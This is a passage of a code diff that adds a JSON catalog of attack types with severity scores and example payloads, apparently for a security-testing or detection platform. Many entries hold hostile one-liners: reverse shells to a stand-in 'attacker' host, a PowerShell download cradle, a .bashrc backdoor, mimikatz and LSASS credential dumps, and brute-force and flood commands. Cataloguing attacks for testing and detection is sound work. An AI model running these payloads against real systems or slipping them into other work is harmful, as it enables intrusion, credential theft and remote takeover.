+      "default_payload": "Concurrent requests x 100",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_negative_quantity",
+      "category": "web_business",
+      "display_label": "负数量绕过",
+      "description": "负数量绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "quantity=-1",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_replay",
+      "category": "web_business",
+      "display_label": "请求重放",
+      "description": "请求重放 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "Replay successful payment request",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_step_skip",
+      "category": "web_business",
+      "display_label": "跳步绕过",
+      "description": "跳步绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "Skip /verify-otp → /complete",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_otp_bypass",
+      "category": "web_business",
+      "display_label": "OTP 绕过",
+      "description": "OTP 绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "otp=000000 brute",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_2fa_bypass",
+      "category": "web_business",
+      "display_label": "2FA 绕过",
+      "description": "2FA 绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "Modify response status code 401→200",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_account_takeover",
+      "category": "web_business",
+      "display_label": "账户接管",
+      "description": "账户接管 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "Reset link with attacker email",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_mass_assignment",
+      "category": "web_business",
+      "display_label": "Mass Assignment 越权",
+      "description": "Mass Assignment 越权 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "{\"role\":\"admin\"}",
+      "target_layer": "application"
+    },
+    {
+      "name": "api_excessive_data_exposure",
+      "category": "web_business",
+      "display_label": "API 过度数据暴露",
+      "description": "API 过度数据暴露 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "GET /api/users (returns SSN/passwd hash)",
+      "target_layer": "application"
+    },
+    {
+      "name": "api_lack_of_rate_limit",
+      "category": "web_business",
+      "display_label": "API 缺少限速",
+      "description": "API 缺少限速 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "x100000 brute force",
+      "target_layer": "application"
+    },
+    {
+      "name": "websocket_origin_bypass",
+      "category": "web_business",
+      "display_label": "WebSocket Origin 绕过",
+      "description": "WebSocket Origin 绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "Origin: null",
+      "target_layer": "application"
+    },
+    {
+      "name": "cors_misconfig",
+      "category": "web_business",
+      "display_label": "CORS 配置不当",
+      "description": "CORS 配置不当 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "Origin: evil.example.com → ACAO: *",
+      "target_layer": "application"
+    },
+    {
+      "name": "host_header_injection",
+      "category": "web_business",
+      "display_label": "Host 头注入",
+      "description": "Host 头注入 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "Host: evil.example.com",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_ssh",
+      "category": "credential",
+      "display_label": "SSH 暴力破解",
+      "description": "SSH 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "hydra -l root -P pass.txt ssh://target",
+      "target_layer": "host"
+    },
+    {
+      "name": "brute_force_http_basic",
+      "category": "credential",
+      "display_label": "HTTP Basic 暴力破解",
+      "description": "HTTP Basic 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "Authorization: Basic YWRtaW46cGFzcw==",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_http_form",
+      "category": "credential",
+      "display_label": "HTTP 表单暴力破解",
+      "description": "HTTP 表单暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "username=admin&password=PASS",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_rdp",
+      "category": "credential",
+      "display_label": "RDP 暴力破解",
+      "description": "RDP 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "ncrack -u admin -P pass.txt rdp://target",
+      "target_layer": "host"
+    },
+    {
+      "name": "brute_force_smb",
+      "category": "credential",
+      "display_label": "SMB 暴力破解",
+      "description": "SMB 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "smbclient //target/share -U admin -P pass",
+      "target_layer": "host"
+    },
+    {
+      "name": "brute_force_ftp",
+      "category": "credential",
+      "display_label": "FTP 暴力破解",
+      "description": "FTP 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "hydra -l ftp -P pass.txt ftp://target",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_mysql",
+      "category": "credential",
+      "display_label": "MySQL 暴力破解",
+      "description": "MySQL 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "mysql -u root -p -h target",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_postgres",
+      "category": "credential",
+      "display_label": "PostgreSQL 暴力破解",
+      "description": "PostgreSQL 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "psql -U postgres -h target",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_redis",
+      "category": "credential",
+      "display_label": "Redis 暴力破解",
+      "description": "Redis 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "redis-cli -a PASS ping",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_mongodb",
+      "category": "credential",
+      "display_label": "MongoDB 暴力破解",
+      "description": "MongoDB 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "mongo -u admin -p PASS target",
+      "target_layer": "application"
+    },
+    {
+      "name": "brute_force_vnc",
+      "category": "credential",
+      "display_label": "VNC 暴力破解",
+      "description": "VNC 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "vncviewer target -passwd",
+      "target_layer": "host"
+    },
+    {
+      "name": "brute_force_telnet",
+      "category": "credential",
+      "display_label": "Telnet 暴力破解",
+      "description": "Telnet 暴力破解 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "telnet target",
+      "target_layer": "host"
+    },
+    {
+      "name": "password_spray",
+      "category": "credential",
+      "display_label": "密码喷洒",
+      "description": "密码喷洒 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "spray Password123 against domain users",
+      "target_layer": "application"
+    },
+    {
+      "name": "password_spray_o365",
+      "category": "credential",
+      "display_label": "O365 密码喷洒",
+      "description": "O365 密码喷洒 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "spray attack via /common/oauth2/token",
+      "target_layer": "application"
+    },
+    {
+      "name": "credential_stuffing",
+      "category": "credential",
+      "display_label": "撞库攻击",
+      "description": "撞库攻击 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "leaked credentials replay",
+      "target_layer": "application"
+    },
+    {
+      "name": "default_credentials",
+      "category": "credential",
+      "display_label": "默认凭证利用",
+      "description": "默认凭证利用 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "admin:admin / root:toor",
+      "target_layer": "application"
+    },
+    {
+      "name": "weak_credential",
+      "category": "credential",
+      "display_label": "弱口令",
+      "description": "弱口令 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 55,
+      "default_payload": "admin:123456",
+      "target_layer": "application"
+    },
+    {
+      "name": "kerberos_kerberoast",
+      "category": "credential",
+      "display_label": "Kerberos Kerberoasting",
+      "description": "Kerberos Kerberoasting —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "Rubeus.exe kerberoast /outfile:hashes.txt",
+      "target_layer": "host"
+    },
+    {
+      "name": "kerberos_asreproast",
+      "category": "credential",
+      "display_label": "Kerberos AS-REP Roasting",
+      "description": "Kerberos AS-REP Roasting —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "GetNPUsers.py domain/ -dc-ip target",
+      "target_layer": "host"
+    },
+    {
+      "name": "kerberos_golden_ticket",
+      "category": "credential",
+      "display_label": "Kerberos Golden Ticket",
+      "description": "Kerberos Golden Ticket —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "mimikatz kerberos::golden /user:admin",
+      "target_layer": "host"
+    },
+    {
+      "name": "kerberos_silver_ticket",
+      "category": "credential",
+      "display_label": "Kerberos Silver Ticket",
+      "description": "Kerberos Silver Ticket —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "mimikatz kerberos::golden /service:cifs",
+      "target_layer": "host"
+    },
+    {
+      "name": "pass_the_hash",
+      "category": "credential",
+      "display_label": "Pass-the-Hash",
+      "description": "Pass-the-Hash —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "pth-winexe -U admin%aad3b...:hash //target",
+      "target_layer": "host"
+    },
+    {
+      "name": "pass_the_ticket",
+      "category": "credential",
+      "display_label": "Pass-the-Ticket",
+      "description": "Pass-the-Ticket —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "mimikatz kerberos::ptt ticket.kirbi",
+      "target_layer": "host"
+    },
+    {
+      "name": "overpass_the_hash",
+      "category": "credential",
+      "display_label": "Over-pass-the-Hash",
+      "description": "Over-pass-the-Hash —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "Rubeus.exe asktgt /user:admin /rc4:hash",
+      "target_layer": "host"
+    },
+    {
+      "name": "dcsync_attack",
+      "category": "credential",
+      "display_label": "DCSync 域控同步",
+      "description": "DCSync 域控同步 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "mimikatz lsadump::dcsync /user:krbtgt",
+      "target_layer": "host"
+    },
+    {
+      "name": "responder_llmnr_poisoning",
+      "category": "credential",
+      "display_label": "Responder LLMNR/NBT-NS 投毒",
+      "description": "Responder LLMNR/NBT-NS 投毒 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "responder -I eth0 -wrf",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ntlm_relay",
+      "category": "credential",
+      "display_label": "NTLM 中继",
+      "description": "NTLM 中继 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "ntlmrelayx.py -t smb://target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "mimikatz_credential_dump",
+      "category": "credential",
+      "display_label": "mimikatz 凭证抓取",
+      "description": "mimikatz 凭证抓取 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "mimikatz sekurlsa::logonpasswords",
+      "target_layer": "host"
+    },
+    {
+      "name": "lsass_dump",
+      "category": "credential",
+      "display_label": "LSASS 内存转储",
+      "description": "LSASS 内存转储 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "procdump -ma lsass.exe lsass.dmp",
+      "target_layer": "host"
+    },
+    {
+      "name": "dpapi_credential_decrypt",
+      "category": "credential",
+      "display_label": "DPAPI 凭证解密",
+      "description": "DPAPI 凭证解密 —— 凭证窃取 / 暴力破解类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "mimikatz dpapi::masterkey",
+      "target_layer": "host"
+    },
+    {
+      "name": "dns_tunneling",
+      "category": "network_protocol",
+      "display_label": "DNS 隧道",
+      "description": "DNS 隧道 —— 网络协议层基础攻击型",
+      "severity_score": 80,
+      "default_payload": "iodine -f -P pass evil.example.com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dns_zone_transfer",
+      "category": "network_protocol",
+      "display_label": "DNS 区域传送",
+      "description": "DNS 区域传送 —— 网络协议层基础攻击型",
+      "severity_score": 50,
+      "default_payload": "dig axfr @target example.com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dns_cache_poisoning",
+      "category": "network_protocol",
+      "display_label": "DNS 缓存投毒",
+      "description": "DNS 缓存投毒 —— 网络协议层基础攻击型",
+      "severity_score": 80,
+      "default_payload": "Forged response with attacker IP",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dns_amplification",
+      "category": "network_protocol",
+      "display_label": "DNS 放大攻击",
+      "description": "DNS 放大攻击 —— 网络协议层基础攻击型",
+      "severity_score": 65,
+      "default_payload": "ANY query to open resolver",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "icmp_tunneling",
+      "category": "network_protocol",
+      "display_label": "ICMP 隧道",
+      "description": "ICMP 隧道 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "ptunnel -p tunnel.example.com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "http_tunneling",
+      "category": "network_protocol",
+      "display_label": "HTTP 隧道",
+      "description": "HTTP 隧道 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "httptunnel hts/htc",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "smb_relay",
+      "category": "network_protocol",
+      "display_label": "SMB 中继",
+      "description": "SMB 中继 —— 网络协议层基础攻击型",
+      "severity_score": 85,
+      "default_payload": "ntlmrelayx -tf targets.txt -smb2support",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "smb_eternal_blue",
+      "category": "network_protocol",
+      "display_label": "SMB EternalBlue (MS17-010)",
+      "description": "SMB EternalBlue (MS17-010) —— 网络协议层基础攻击型",
+      "severity_score": 95,
+      "default_payload": "exploit/windows/smb/ms17_010_eternalblue",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "smb_ghost",
+      "category": "network_protocol",
+      "display_label": "SMBGhost (CVE-2020-0796)",
+      "description": "SMBGhost (CVE-2020-0796) —— 网络协议层基础攻击型",
+      "severity_score": 92,
+      "default_payload": "exploit/windows/smb/cve_2020_0796_smbghost",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "arp_spoofing",
+      "category": "network_protocol",
+      "display_label": "ARP 欺骗",
+      "description": "ARP 欺骗 —— 网络协议层基础攻击型",
+      "severity_score": 75,
+      "default_payload": "arpspoof -t target -i eth0 gateway",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "arp_poisoning_mitm",
+      "category": "network_protocol",
+      "display_label": "ARP 中间人投毒",
+      "description": "ARP 中间人投毒 —— 网络协议层基础攻击型",
+      "severity_score": 80,
+      "default_payload": "ettercap -T -M arp:remote /target/ /gateway/",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dhcp_starvation",
+      "category": "network_protocol",
+      "display_label": "DHCP 耗尽",
+      "description": "DHCP 耗尽 —— 网络协议层基础攻击型",
+      "severity_score": 65,
+      "default_payload": "yersinia -G → DHCP DISCOVER flood",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dhcp_rogue_server",
+      "category": "network_protocol",
+      "display_label": "DHCP 流氓服务器",
+      "description": "DHCP 流氓服务器 —— 网络协议层基础攻击型",
+      "severity_score": 75,
+      "default_payload": "Rogue DHCP server with attacker DNS",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "vlan_hopping_dtp",
+      "category": "network_protocol",
+      "display_label": "VLAN 跳跃 - DTP",
+      "description": "VLAN 跳跃 - DTP —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "yersinia dtp negotiate",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "vlan_hopping_double_tag",
+      "category": "network_protocol",
+      "display_label": "VLAN 跳跃 - 双层标签",
+      "description": "VLAN 跳跃 - 双层标签 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "Double 802.1Q encapsulation",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "stp_root_takeover",
+      "category": "network_protocol",
+      "display_label": "STP 根桥劫持",
+      "description": "STP 根桥劫持 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "yersinia stp claim root",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ipv6_ra_flood",
+      "category": "network_protocol",
+      "display_label": "IPv6 RA Flood",
+      "description": "IPv6 RA Flood —— 网络协议层基础攻击型",
+      "severity_score": 60,
+      "default_payload": "flood_router6 eth0",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ipv6_ra_guard_bypass",
+      "category": "network_protocol",
+      "display_label": "IPv6 RA Guard 绕过",
+      "description": "IPv6 RA Guard 绕过 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "Fragmented RA with destination header",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ipv6_dhcpv6_starvation",
+      "category": "network_protocol",
+      "display_label": "DHCPv6 耗尽",
+      "description": "DHCPv6 耗尽 —— 网络协议层基础攻击型",
+      "severity_score": 60,
+      "default_payload": "dhcpv6_solicit_flood",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ipv6_neighbor_spoofing",
+      "category": "network_protocol",
+      "display_label": "IPv6 邻居发现欺骗",
+      "description": "IPv6 邻居发现欺骗 —— 网络协议层基础攻击型",
+      "severity_score": 75,
+      "default_payload": "parasite6 eth0",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ndp_redirect_attack",
+      "category": "network_protocol",
+      "display_label": "NDP Redirect 攻击",
+      "description": "NDP Redirect 攻击 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "redir6 victim attacker target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "syn_flood_dos",
+      "category": "network_protocol",
+      "display_label": "SYN Flood DoS",
+      "description": "SYN Flood DoS —— 网络协议层基础攻击型",
+      "severity_score": 50,
+      "default_payload": "hping3 -S -p 80 --flood target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "udp_flood_dos",
+      "category": "network_protocol",
+      "display_label": "UDP Flood DoS",
+      "description": "UDP Flood DoS —— 网络协议层基础攻击型",
+      "severity_score": 50,
+      "default_payload": "hping3 --udp --flood target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "slowloris_dos",
+      "category": "network_protocol",
+      "display_label": "Slowloris 慢速 DoS",
+      "description": "Slowloris 慢速 DoS —— 网络协议层基础攻击型",
+      "severity_score": 55,
+      "default_payload": "slowloris.py -p 80 target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ntp_amplification",
+      "category": "network_protocol",
+      "display_label": "NTP 放大攻击",
+      "description": "NTP 放大攻击 —— 网络协议层基础攻击型",
+      "severity_score": 65,
+      "default_payload": "monlist query",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "memcached_amplification",
+      "category": "network_protocol",
+      "display_label": "Memcached 放大攻击",
+      "description": "Memcached 放大攻击 —— 网络协议层基础攻击型",
+      "severity_score": 70,
+      "default_payload": "stats query",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "ssdp_amplification",
+      "category": "network_protocol",
+      "display_label": "SSDP 放大攻击",
+      "description": "SSDP 放大攻击 —— 网络协议层基础攻击型",
+      "severity_score": 65,
+      "default_payload": "M-SEARCH discovery",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "snmp_amplification",
+      "category": "network_protocol",
+      "display_label": "SNMP 放大攻击",
+      "description": "SNMP 放大攻击 —— 网络协议层基础攻击型",
+      "severity_score": 60,
+      "default_payload": "GetBulk query",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "packet_fragmentation_evasion",
+      "category": "network_protocol",
+      "display_label": "包分片绕过 IDS",
+      "description": "包分片绕过 IDS —— 网络协议层基础攻击型",
+      "severity_score": 75,
+      "default_payload": "fragroute -f rules.conf target",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "tcp_session_hijack",
+      "category": "network_protocol",
+      "display_label": "TCP 会话劫持",
+      "description": "TCP 会话劫持 —— 网络协议层基础攻击型",
+      "severity_score": 80,
+      "default_payload": "Predict seq + spoof",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_bash_tcp",
+      "category": "c2",
+      "display_label": "Bash TCP 反弹 shell",
+      "description": "Bash TCP 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "bash -i >& /dev/tcp/attacker/4444 0>&1",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_bash_udp",
+      "category": "c2",
+      "display_label": "Bash UDP 反弹 shell",
+      "description": "Bash UDP 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "bash -i >& /dev/udp/attacker/4444 0>&1",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_powershell",
+      "category": "c2",
+      "display_label": "PowerShell 反弹 shell",
+      "description": "PowerShell 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "powershell -NoP -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_python",
+      "category": "c2",
+      "display_label": "Python 反弹 shell",
+      "description": "Python 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"attacker\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_perl",
+      "category": "c2",
+      "display_label": "Perl 反弹 shell",
+      "description": "Perl 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "perl -e 'use Socket;...'",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_ruby",
+      "category": "c2",
+      "display_label": "Ruby 反弹 shell",
+      "description": "Ruby 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker\",4444)...'",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_php",
+      "category": "c2",
+      "display_label": "PHP 反弹 shell",
+      "description": "PHP 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "php -r '$sock=fsockopen(\"attacker\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_nc",
+      "category": "c2",
+      "display_label": "Netcat 反弹 shell",
+      "description": "Netcat 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "nc -e /bin/sh attacker 4444",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "reverse_shell_socat",
+      "category": "c2",
+      "display_label": "socat 反弹 shell",
+      "description": "socat 反弹 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "socat exec:bash -i,pty,stderr,setsid,sigint,sane tcp:attacker:4444",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "bind_shell_tcp",
+      "category": "c2",
+      "display_label": "TCP 绑定 shell",
+      "description": "TCP 绑定 shell —— C2 远控通道类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "nc -lvp 4444 -e /bin/sh",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "cobalt_strike_beacon",
+      "category": "c2",
+      "display_label": "Cobalt Strike Beacon",
+      "description": "Cobalt Strike Beacon —— C2 远控通道类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "stage.0/dpixel beacon download",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "cobalt_strike_dns_beacon",
+      "category": "c2",
+      "display_label": "Cobalt Strike DNS Beacon",
+      "description": "Cobalt Strike DNS Beacon —— C2 远控通道类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "dns: malleable c2 dns profile",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "metasploit_meterpreter",
+      "category": "c2",
+      "display_label": "Metasploit Meterpreter",
+      "description": "Metasploit Meterpreter —— C2 远控通道类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "windows/x64/meterpreter/reverse_https",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "empire_powershell_agent",
+      "category": "c2",
+      "display_label": "Empire PowerShell Agent",
+      "description": "Empire PowerShell Agent —— C2 远控通道类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "Invoke-Empire stager",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "sliver_implant",
+      "category": "c2",
+      "display_label": "Sliver Implant 会话",
+      "description": "Sliver Implant 会话 —— C2 远控通道类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "sliver-server generate --mtls attacker:8443",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "mythic_apollo_agent",
+      "category": "c2",
+      "display_label": "Mythic Apollo Agent",
+      "description": "Mythic Apollo Agent —— C2 远控通道类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "apollo http profile",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "brute_ratel_badger",
+      "category": "c2",
+      "display_label": "Brute Ratel Badger",
+      "description": "Brute Ratel Badger —— C2 远控通道类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "badger payload http(s)",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "merlin_http2_agent",
+      "category": "c2",
+      "display_label": "Merlin HTTP/2 Agent",
+      "description": "Merlin HTTP/2 Agent —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "merlinAgent -url https://attacker:443",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "dns_c2_dnscat2",
+      "category": "c2",
+      "display_label": "dnscat2 DNS C2",
+      "description": "dnscat2 DNS C2 —— C2 远控通道类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "dnscat2 --dns server=attacker.example.com",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "icmp_c2_prismatica",
+      "category": "c2",
+      "display_label": "ICMP C2 隧道",
+      "description": "ICMP C2 隧道 —— C2 远控通道类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "Prism encoded ICMP echo",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "https_c2_covenant",
+      "category": "c2",
+      "display_label": "Covenant HTTPS C2",
+      "description": "Covenant HTTPS C2 —— C2 远控通道类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "covenant grunt http listener",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "websocket_c2",
+      "category": "c2",
+      "display_label": "WebSocket C2",
+      "description": "WebSocket C2 —— C2 远控通道类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "wsproxy attacker:8080/ws",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "c2_domain_fronting",
+      "category": "c2",
+      "display_label": "C2 域前置",
+      "description": "C2 域前置 —— C2 远控通道类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "Host: cdn.example.com  inner: attacker",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "c2_via_telegram",
+      "category": "c2",
+      "display_label": "Telegram Bot C2",
+      "description": "Telegram Bot C2 —— C2 远控通道类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "tg-bot api as transport",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "c2_via_github_gist",
+      "category": "c2",
+      "display_label": "GitHub Gist C2",
+      "description": "GitHub Gist C2 —— C2 远控通道类基础攻击型",
+      "severity_score": 78,
+      "default_payload": "gist read/write as channel",
+      "target_layer": "traffic"
+    },
+    {
+      "name": "linux_systemd_service",
+      "category": "persistence",
+      "display_label": "Linux systemd 服务持久化",
+      "description": "Linux systemd 服务持久化 —— 主机持久化基础攻击型",
+      "severity_score": 80,
+      "default_payload": "/etc/systemd/system/evil.service",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_systemd_timer",
+      "category": "persistence",
+      "display_label": "Linux systemd timer 持久化",
+      "description": "Linux systemd timer 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 78,
+      "default_payload": "/etc/systemd/system/evil.timer",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_cron_root",
+      "category": "persistence",
+      "display_label": "Linux cron root 持久化",
+      "description": "Linux cron root 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 80,
+      "default_payload": "* * * * * /tmp/evil.sh",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_cron_user",
+      "category": "persistence",
+      "display_label": "Linux 用户 cron 持久化",
+      "description": "Linux 用户 cron 持久化 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "crontab -e: * * * * * /tmp/evil.sh",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_bashrc_backdoor",
+      "category": "persistence",
+      "display_label": "Linux .bashrc 后门",
+      "description": "Linux .bashrc 后门 —— 主机持久化基础攻击型",
+      "severity_score": 70,
+      "default_payload": "echo 'curl evil|sh' >> ~/.bashrc",
+      "target_layer": "host"
+    },
+    {
+      "name": "linux_init_d",
+      "category": "persistence",
+      "display_label": "Linux /etc/init.d 持久化",
+      "description": "Linux /etc/init.d 持久化 —— 主机持久化基础攻击型",
